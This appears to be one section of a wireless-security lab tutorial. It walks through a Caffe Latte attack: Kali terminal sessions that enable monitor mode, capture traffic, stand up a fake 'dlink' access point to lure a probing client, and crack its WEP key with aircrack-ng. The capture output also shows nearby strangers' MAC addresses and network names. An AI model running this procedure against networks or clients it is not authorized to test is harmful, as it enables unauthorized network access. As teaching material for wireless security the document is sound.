#### Part	17: Caffe Latte Attack Demo

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Start ```airodump-ng```

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --essid dlink --write CaffeLatte

 CH  4 ][ Elapsed: 3 mins ][ 2017-06-06 20:23 ][ Broken SKA: 00:C0:CA:92:3C:89

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 00:C0:CA:92:3C:89    0   0     3722    21057  158   4  54   WEP  WEP    SKA  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 00:C0:CA:92:3C:89  BC:9F:EF:69:35:19  -57    0 - 5      8    21543  dlink,HiddenSSID
 (not associated)   16:66:C5:DF:B0:C9  -66    0 - 1      0        1
 (not associated)   64:80:99:D7:8E:03  -66    0 - 1      0        3  ATT016
 (not associated)   20:7C:8F:31:D4:55  -66    0 - 1      0       12
 (not associated)   A4:5E:60:E1:D7:17  -67    0 - 1      0        1  NETGEAR35
 (not associated)   3C:BB:FD:98:55:54  -64    0 - 1     56        4  NETGEAR47
 (not associated)   F4:F5:D8:2F:99:D0  -62    0 - 1    649       16  Lowspeed
 (not associated)   F4:F5:D8:49:3D:C4  -69    0 - 1      0        1  Phanisri
 (not associated)   FC:3D:93:32:BF:A0  -70    0 - 1      0        9
 (not associated)   AC:72:89:03:90:CC  -73    0 - 1      0        2  NETGEAR15
 (not associated)   80:D2:1D:44:EA:44  -45    0 - 1      0       11  NETGEAR10
 (not associated)   B8:8A:60:AA:DA:02  -50    0 - 1      0        4  Kaiser
 (not associated)   C2:1E:4B:9B:AA:29  -57    0 - 1      0        6
 (not associated)   AC:EE:9E:63:EB:22  -58    0 - 1      0        1

root@kali:~#

```

Create a fake AP ```dlink``` as the client was probing for that AP

```sh
root@kali:~# airbase-ng -W 1 --essid dlink --channel 4 wlan0mon -L -x 10
20:20:06  Created tap interface at0
20:20:06  Trying to set MTU on at0 to 1500
20:20:06  Access Point with BSSID 00:C0:CA:92:3C:89 started.
20:20:19  Broken SKA: BC:9F:EF:69:35:19 (expected: 170, got 157 bytes)
20:20:19  SKA from BC:9F:EF:69:35:19
20:20:19  Client BC:9F:EF:69:35:19 associated (WEP) to ESSID: "dlink"
20:20:44  Starting Caffe-Latte attack against BC:9F:EF:69:35:19 at 10 pps.
```

The client successfully connected to our fake soft AP.

Ones we have more than 20,000 ```Data``` packets we can go ahead and crack it using ```Aircrack-ng```

```sh
root@kali:~# aircrack-ng CaffeLatte-01.cap
Opening CaffeLatte-01.cap
Read 109313 packets.

   #  BSSID              ESSID                     Encryption

   1  00:C0:CA:92:3C:89  dlink                     WEP (20198 IVs)

Choosing first network as target.

Opening CaffeLatte-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 20230 ivs.

                                          Aircrack-ng 1.2 rc4


                          [00:00:01] Tested 129285 keys (got 20111 IVs)

   KB    depth   byte(vote)
    0    0/  2   AA(32768) B4(30720) A3(27392) 65(26368) 6C(26112) F7(25856) 10(25600)
    1    2/ 18   BB(25856) 34(25344) 00(25088) 3D(25088) 60(24576) AB(24576) B4(24576)
    2    0/  8   CC(27904) 76(27648) 5D(26880) 69(26880) DE(26368) DC(25856) 0A(25856)
    3    3/ 16   DD(25600) 2E(25600) 50(25600) 2B(25344) A5(25088) DF(25088) F1(25088)
    4   21/ 29   00(23808) 05(23552) 25(23552) 34(23552) 63(23552) E0(23552) E7(23552)

                         KEY FOUND! [ AA:BB:CC:DD:EE ]
	Decrypted correctly: 100%


root@kali:~#
```

<---Add image here--->